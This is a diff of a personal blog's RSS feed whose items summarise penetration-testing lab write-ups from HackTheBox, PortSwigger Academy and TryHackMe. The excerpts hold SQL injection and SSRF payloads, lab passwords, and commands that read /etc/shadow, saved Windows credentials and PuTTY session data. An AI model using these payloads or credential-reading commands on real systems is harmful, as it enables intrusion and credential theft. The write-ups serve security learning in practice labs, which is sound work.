@@ -1,21 +1,83 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
   <channel>
-    <title>Lets Learn Together</title>
+    <title>Home on Lets Learn Together</title>
     <link>https://d31ty.github.io/</link>
-    <description>Recent content on Lets Learn Together</description>
+    <description>Recent content in Home on Lets Learn Together</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Wed, 04 Oct 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://d31ty.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sun, 15 Oct 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://d31ty.github.io/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>Setup AD in Google</title>
-      <link>https://d31ty.github.io/posts/sample_post/</link>
-      <pubDate>Wed, 04 Oct 2023 00:00:00 +0000</pubDate>
+      <title>HTB Analytics - 🐧</title>
+      <link>https://d31ty.github.io/htb/analytics-htb/</link>
+      <pubDate>Sun, 15 Oct 2023 00:00:00 +0000</pubDate>
       
-      <guid>https://d31ty.github.io/posts/sample_post/</guid>
-      <description>How to Setup Google Ad Manager, Keep AdSense, and Earn More Revenue in Five Steps Intowow Intowow · Follow
-5 min read · Jun 13, 2019 7
-For publishers who got started with monetization by utilizing Google AdSense as their self-serve advertising platform, the time often comes when site growth and/or direct advertising opportunities prompt a desire for more features, greater flexibility and control, or just more revenue. When any of these feelings start cropping up, it’s time to consider upgrading to Google Ad Manager.</description>
+      <guid>https://d31ty.github.io/htb/analytics-htb/</guid>
+      <description>Analytics is a new easy linux machine released for Open Beta Season III Enumeration: Port Scan: sudo nmap -sC -sV -Pn -A 10.10.11.233 [sudo] password for d31ty: Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-13 12:58 IST Nmap scan report for 10.10.11.233 Host is up (0.38s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http nginx 1.</description>
+    </item>
+    
+    <item>
+      <title>Postswigger Server Based Attacks - Authentication</title>
+      <link>https://d31ty.github.io/portswigger/server-based/authentication/</link>
+      <pubDate>Sun, 15 Oct 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://d31ty.github.io/portswigger/server-based/authentication/</guid>
+      <description>Brute Force Lab 1: Username and Password Brute force: Username: accounts Password: robert Lab 2: Username and Password Brute force with the message from response: Username: oracle Password: soccer Username and Password Brute force with 30mins to retry: </description>
+    </item>
+    
+    <item>
+      <title>TryHackMe - Enumeration Post Compromise</title>
+      <link>https://d31ty.github.io/thm/learning-paths/red-teaming/enumeration-post-compromise/</link>
+      <pubDate>Sun, 15 Oct 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://d31ty.github.io/thm/learning-paths/red-teaming/enumeration-post-compromise/</guid>
+      <description>Linux Enumeration OS Version Details
+ls /etc/*-release hostname Users and groups
+cat /etc/passwd cat /etc/group cat /etc/shadow Sensitive Info
+ls -lh /var/mail/ ls -lh /usr/bin/ ls -lh /sbin/ Installed Packages
+dpkg -l Current user info
+who whoami last id Network Details
+ip a s cat /etc/resolv.conf sudo netstat -plt netstat -atupn will show All TCP and UDP listening and established connections and the program names with addresses and ports in numeric format.</description>
+    </item>
+    
+    <item>
+      <title>TryHackMe - Lay of the Land - Post Compromise</title>
+      <link>https://d31ty.github.io/thm/learning-paths/red-teaming/the-lay-of-the-land-post-compromise/</link>
+      <pubDate>Sun, 15 Oct 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://d31ty.github.io/thm/learning-paths/red-teaming/the-lay-of-the-land-post-compromise/</guid>
+      <description>Internal Network: A Demilitarized Zone (DMZ) Network Enumeration netstat -na arp -a AD - Environment Components of AD List of Active Directory components that we need to be familiar with:
+Domain Controllers Organizational Units AD objects AD Domains Forest AD Service Accounts: Built-in local users, Domain users, Managed service accounts Domain Administrators Checking for AD systeminfo | findstr Domain Admin Groups BUILTIN\Administrator Local admin access on a domain controller Domain Admins Administrative access to all resources in the domain Enterprise Admins Available only in the forest root Schema Admins Capable of modifying domain/forest; useful for red teamers Server Operators Can manage domain servers Account Operators Can manage users that are not in privileged group AD Info Get-ADUser -Filter * Get-ADUser -Filter * -SearchBase &amp;#34;CN=Users,DC=THMREDTEAM,DC=COM&amp;#34; Host Security Solution - Info AntiVirus wmic /namespace:\\root\securitycenter2 path antivirusproduct $$ or $$</description>
+    </item>
+    
+    <item>
+      <title>Postswigger Server Based Attacks - SQLi</title>
+      <link>https://d31ty.github.io/portswigger/server-based/sqli/</link>
+      <pubDate>Sun, 15 Oct 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://d31ty.github.io/portswigger/server-based/sqli/</guid>
+      <description>Different SQLi Methods Lab 1: https://0aab00d603b57c2084c1bee800e900c4.web-security-academy.net/filter?category=Gifts&amp;#39;+OR+1=1-- Lab 2: administrator&amp;#39;-- Lab 3: USERNAME: carlos administrator wiener PASSWORD: r5h2o8l8ebgh9t8qppua fppcw9cmla9y2g8ogewn p85707uom2jve88xzdqe Query: &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&amp;lt;stockCheck&amp;gt;&amp;lt;productId&amp;gt;1 &amp;lt;/productId&amp;gt;&amp;lt;storeId&amp;gt;&amp;lt;@hex_entities&amp;gt;1 UNION SELECT USERNAME FROM USERS&amp;lt;@/hex_entities&amp;gt;&amp;lt;/storeId&amp;gt;&amp;lt;/stockCheck&amp;gt; &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&amp;lt;stockCheck&amp;gt;&amp;lt;productId&amp;gt;1 &amp;lt;/productId&amp;gt;&amp;lt;storeId&amp;gt;&amp;lt;@hex_entities&amp;gt;1 UNION SELECT PASSWORD FROM USERS&amp;lt;@/hex_entities&amp;gt;&amp;lt;/storeId&amp;gt;&amp;lt;/stockCheck&amp;gt; Other Solution:
+SQL | Concatenation Operator So the command is = SELECT USERNAME || &amp;lsquo;~&amp;rsquo; || PASSWORD FROM USER
+Lesson Learned: If select * doesn&amp;rsquo;t work, then try enumerating the column names in SQLi</description>
+    </item>
+    
+    <item>
+      <title>Postswigger Server Based Attacks - SSRF</title>
+      <link>https://d31ty.github.io/portswigger/server-based/ssrf/</link>
+      <pubDate>Sun, 15 Oct 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://d31ty.github.io/portswigger/server-based/ssrf/</guid>
+      <description>Lab 1: Basic SSRF - Delete user Carlos
+stockapi = http://localhost/admin/delete?username=carlos Lab 2: stockapi = http://192.168.0.4/admin/delete?username=carlos Lab 3: stockapi = http://127.1/%25%36%31dmin Lab 4: Lab 5: stockapi = /product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete%3fusername%3dcarlos </description>
+    </item>
+    
+    <item>
+      <title>TryHackMe - Windows Privilege Escalation</title>
+      <link>https://d31ty.github.io/thm/learning-paths/red-teaming/windows-privilege-escalation/</link>
+      <pubDate>Sun, 15 Oct 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://d31ty.github.io/thm/learning-paths/red-teaming/windows-privilege-escalation/</guid>
+      <description>THM-Windows Privilege Escalation Enumeration and Information Gathering Windows Pro - Uses Bitlocker encryption Find Account details using the command: lusrmgr.msc The SYSTEM account has more privileges than the Administrator user Powershell History: type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt Saved Windows Credentials: cmdkey /list runas /savecred /user:admin cmd.exe IIS Configuration type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString Retrieve Credentials Example Software: reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &amp;#34;Proxy&amp;#34; /s Scheduled Tasks schtasks /query /tn vulntask /fo list /v File permissions of exe icacls c:\tasks\schtask.</description>
     </item>
     
   </channel>
